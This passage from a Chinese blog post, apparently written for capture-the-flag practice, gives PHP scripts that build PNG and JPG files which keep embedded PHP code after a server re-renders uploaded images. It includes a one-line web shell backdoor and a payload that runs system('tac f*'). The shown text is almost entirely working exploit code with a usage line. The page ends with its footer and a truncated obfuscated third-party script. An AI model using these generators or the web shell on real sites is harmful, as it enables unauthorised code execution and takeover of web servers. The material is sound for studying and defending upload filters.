           <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0xdc</span><span class="token punctuation">,</span> <span class="token number">0xa3</span><span class="token punctuation">,</span> <span class="token number">0x9f</span><span class="token punctuation">,</span>
           <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xa5</span><span class="token punctuation">,</span> <span class="token number">0xbe</span><span class="token punctuation">,</span> <span class="token number">0x5f</span><span class="token punctuation">,</span> <span class="token number">0x76</span><span class="token punctuation">,</span> <span class="token number">0x74</span><span class="token punctuation">,</span> <span class="token number">0x5a</span><span class="token punctuation">,</span> <span class="token number">0x4c</span><span class="token punctuation">,</span>
           <span class="token number">0xa1</span><span class="token punctuation">,</span> <span class="token number">0x3f</span><span class="token punctuation">,</span> <span class="token number">0x7a</span><span class="token punctuation">,</span> <span class="token number">0xbf</span><span class="token punctuation">,</span> <span class="token number">0x30</span><span class="token punctuation">,</span> <span class="token number">0x6b</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0x2d</span><span class="token punctuation">,</span>
           <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x7d</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0x9d</span><span class="token punctuation">,</span> <span class="token number">0xad</span><span class="token punctuation">,</span> <span class="token number">0x88</span><span class="token punctuation">,</span> <span class="token number">0xa1</span><span class="token punctuation">,</span>
           <span class="token number">0x66</span><span class="token punctuation">,</span> <span class="token number">0x44</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">;</span>



$img <span class="token operator">=</span> imagecreatetruecolor<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">for</span> <span class="token punctuation">(</span>$y <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $y <span class="token operator">&lt;</span> sizeof<span class="token punctuation">(</span>$p<span class="token punctuation">)</span><span class="token punctuation">;</span> $y <span class="token operator">+=</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
   $r <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token punctuation">]</span><span class="token punctuation">;</span>
   $g <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   $b <span class="token operator">=</span> $p<span class="token punctuation">[</span>$y<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
   $color <span class="token operator">=</span> imagecolorallocate<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> $r<span class="token punctuation">,</span> $g<span class="token punctuation">,</span> $b<span class="token punctuation">)</span><span class="token punctuation">;</span>
   imagesetpixel<span class="token punctuation">(</span>$img<span class="token punctuation">,</span> <span class="token builtin">round</span><span class="token punctuation">(</span>$y <span class="token operator">/</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $color<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

imagepng<span class="token punctuation">(</span>$img<span class="token punctuation">,</span><span class="token string">'2.png'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token operator">//</span>要修改的图片的路径
<span class="token operator">/</span><span class="token operator">*</span> 木马内容
<span class="token operator">&lt;</span>?$_GET<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">(</span>$_POST<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>?<span class="token operator">&gt;</span>
 <span class="token operator">*</span><span class="token operator">/</span>
?<span class="token operator">&gt;</span>
</code></pre> 
<h5><a id="jpg_414"></a>jpg二次渲染</h5> 
<pre><code class="prism language-python"><span class="token operator">&lt;</span>?php
    $miniPayload <span class="token operator">=</span> <span class="token string">"&lt;?php system('tac f*');?&gt;"</span><span class="token punctuation">;</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span>!extension_loaded<span class="token punctuation">(</span><span class="token string">'gd'</span><span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> !function_exists<span class="token punctuation">(</span><span class="token string">'imagecreatefromjpeg'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        die<span class="token punctuation">(</span><span class="token string">'php-gd is not installed'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>!isset<span class="token punctuation">(</span>$argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        die<span class="token punctuation">(</span><span class="token string">'php jpg_payload.php &lt;jpg_name.jpg&gt;'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    set_error_handler<span class="token punctuation">(</span><span class="token string">"custom_error_handler"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">for</span><span class="token punctuation">(</span>$pad <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> $pad <span class="token operator">&lt;</span> <span class="token number">1024</span><span class="token punctuation">;</span> $pad<span class="token operator">+</span><span class="token operator">+</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        $nullbytePayloadSize <span class="token operator">=</span> $pad<span class="token punctuation">;</span>
        $dis <span class="token operator">=</span> new DataInputStream<span class="token punctuation">(</span>$argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $outStream <span class="token operator">=</span> file_get_contents<span class="token punctuation">(</span>$argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        $extraBytes <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        $correctImage <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span>$dis<span class="token operator">-</span><span class="token operator">&gt;</span>readShort<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            die<span class="token punctuation">(</span><span class="token string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>!$dis<span class="token operator">-</span><span class="token operator">&gt;</span>eof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token operator">&amp;</span> <span class="token punctuation">(</span>$dis<span class="token operator">-</span><span class="token operator">&gt;</span>readByte<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $marker <span class="token operator">=</span> $dis<span class="token operator">-</span><span class="token operator">&gt;</span>readByte<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            $size <span class="token operator">=</span> $dis<span class="token operator">-</span><span class="token operator">&gt;</span>readShort<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
            $dis<span class="token operator">-</span><span class="token operator">&gt;</span>skip<span class="token punctuation">(</span>$size<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>$marker <span class="token operator">==</span><span class="token operator">=</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                $startPos <span class="token operator">=</span> $dis<span class="token operator">-</span><span class="token operator">&gt;</span>seek<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                $outStreamTmp <span class="token operator">=</span> 
                    substr<span class="token punctuation">(</span>$outStream<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $startPos<span class="token punctuation">)</span> <span class="token punctuation">.</span> 
                    $miniPayload <span class="token punctuation">.</span> 
                    str_repeat<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span>$nullbytePayloadSize<span class="token punctuation">)</span> <span class="token punctuation">.</span> 
                    substr<span class="token punctuation">(</span>$outStream<span class="token punctuation">,</span> $startPos<span class="token punctuation">)</span><span class="token punctuation">;</span>
                checkImage<span class="token punctuation">(</span><span class="token string">'_'</span><span class="token punctuation">.</span>$argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $outStreamTmp<span class="token punctuation">,</span> TRUE<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>$extraBytes <span class="token operator">!=</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span>!$dis<span class="token operator">-</span><span class="token operator">&gt;</span>eof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                        <span class="token keyword">if</span><span class="token punctuation">(</span>$dis<span class="token operator">-</span><span class="token operator">&gt;</span>readByte<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                            <span class="token keyword">if</span><span class="token punctuation">(</span>$dis<span class="token operator">-</span><span class="token operator">&gt;</span>readByte <span class="token operator">!=</span><span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                                <span class="token keyword">break</span><span class="token punctuation">;</span>
                            <span class="token punctuation">}</span>
                        <span class="token punctuation">}</span>
                    <span class="token punctuation">}</span>
                    $stopPos <span class="token operator">=</span> $dis<span class="token operator">-</span><span class="token operator">&gt;</span>seek<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>
                    $imageStreamSize <span class="token operator">=</span> $stopPos <span class="token operator">-</span> $startPos<span class="token punctuation">;</span>
                    $outStream <span class="token operator">=</span> 
                        substr<span class="token punctuation">(</span>$outStream<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> $startPos<span class="token punctuation">)</span> <span class="token punctuation">.</span> 
                        $miniPayload <span class="token punctuation">.</span> 
                        substr<span class="token punctuation">(</span>
                            str_repeat<span class="token punctuation">(</span><span class="token string">"\0"</span><span class="token punctuation">,</span>$nullbytePayloadSize<span class="token punctuation">)</span><span class="token punctuation">.</span>
                                substr<span class="token punctuation">(</span>$outStream<span class="token punctuation">,</span> $startPos<span class="token punctuation">,</span> $imageStreamSize<span class="token punctuation">)</span><span class="token punctuation">,</span>
                            <span class="token number">0</span><span class="token punctuation">,</span>
                            $nullbytePayloadSize<span class="token operator">+</span>$imageStreamSize<span class="token operator">-</span>$extraBytes<span class="token punctuation">)</span> <span class="token punctuation">.</span> 
                                substr<span class="token punctuation">(</span>$outStream<span class="token punctuation">,</span> $stopPos<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> elseif<span class="token punctuation">(</span>$correctImage<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    $outStream <span class="token operator">=</span> $outStreamTmp<span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>checkImage<span class="token punctuation">(</span><span class="token string">'payload_'</span><span class="token punctuation">.</span>$argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> $outStream<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    die<span class="token punctuation">(</span><span class="token string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    <span class="token keyword">break</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    unlink<span class="token punctuation">(</span><span class="token string">'payload_'</span><span class="token punctuation">.</span>$argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    die<span class="token punctuation">(</span><span class="token string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    function checkImage<span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> $data<span class="token punctuation">,</span> $unlink <span class="token operator">=</span> FALSE<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">global</span> $correctImage<span class="token punctuation">;</span>
        file_put_contents<span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> $data<span class="token punctuation">)</span><span class="token punctuation">;</span>
        $correctImage <span class="token operator">=</span> TRUE<span class="token punctuation">;</span>
        imagecreatefromjpeg<span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>$unlink<span class="token punctuation">)</span>
            unlink<span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> $correctImage<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    function custom_error_handler<span class="token punctuation">(</span>$errno<span class="token punctuation">,</span> $errstr<span class="token punctuation">,</span> $errfile<span class="token punctuation">,</span> $errline<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">global</span> $extraBytes<span class="token punctuation">,</span> $correctImage<span class="token punctuation">;</span>
        $correctImage <span class="token operator">=</span> FALSE<span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span>preg_match<span class="token punctuation">(</span><span class="token string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> $errstr<span class="token punctuation">,</span> $m<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>isset<span class="token punctuation">(</span>$m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                $extraBytes <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">)</span>$m<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">class</span> <span class="token class-name">DataInputStream</span> <span class="token punctuation">{<!-- --></span>
        private $binData<span class="token punctuation">;</span>
        private $order<span class="token punctuation">;</span>
        private $size<span class="token punctuation">;</span>

        public function __construct<span class="token punctuation">(</span>$filename<span class="token punctuation">,</span> $order <span class="token operator">=</span> false<span class="token punctuation">,</span> $fromString <span class="token operator">=</span> false<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $this<span class="token operator">-</span><span class="token operator">&gt;</span>binData <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>
            $this<span class="token operator">-</span><span class="token operator">&gt;</span>order <span class="token operator">=</span> $order<span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>!$fromString<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span><span class="token punctuation">(</span>!file_exists<span class="token punctuation">(</span>$filename<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">|</span> !is_file<span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">)</span>
                    die<span class="token punctuation">(</span><span class="token string">'File not exists ['</span><span class="token punctuation">.</span>$filename<span class="token punctuation">.</span><span class="token string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                $this<span class="token operator">-</span><span class="token operator">&gt;</span>binData <span class="token operator">=</span> file_get_contents<span class="token punctuation">(</span>$filename<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                $this<span class="token operator">-</span><span class="token operator">&gt;</span>binData <span class="token operator">=</span> $filename<span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            $this<span class="token operator">-</span><span class="token operator">&gt;</span>size <span class="token operator">=</span> strlen<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        public function seek<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> <span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>size <span class="token operator">-</span> strlen<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        public function skip<span class="token punctuation">(</span>$skip<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            $this<span class="token operator">-</span><span class="token operator">&gt;</span>binData <span class="token operator">=</span> substr<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">,</span> $skip<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        public function readByte<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>eof<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                die<span class="token punctuation">(</span><span class="token string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            $byte <span class="token operator">=</span> substr<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            $this<span class="token operator">-</span><span class="token operator">&gt;</span>binData <span class="token operator">=</span> substr<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">return</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>$byte<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        public function readShort<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                die<span class="token punctuation">(</span><span class="token string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            $short <span class="token operator">=</span> substr<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            $this<span class="token operator">-</span><span class="token operator">&gt;</span>binData <span class="token operator">=</span> substr<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>order<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                $short <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>$short<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>$short<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                $short <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>$short<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>$short<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> $short<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        public function eof<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">return</span> !$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token operator">|</span><span class="token operator">|</span><span class="token punctuation">(</span>strlen<span class="token punctuation">(</span>$this<span class="token operator">-</span><span class="token operator">&gt;</span>binData<span class="token punctuation">)</span> <span class="token operator">==</span><span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
?<span class="token operator">&gt;</span>
用法  php exp<span class="token punctuation">.</span>php a<span class="token punctuation">.</span>png
</code></pre>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/fe0b03e85f34c9e88b8a2d9fdc94f33d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">UDS之浅谈14 服务</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/1b7af1397deb73b82873e9b20f0a855c/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">强化学习中的两种探索-平衡策略</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X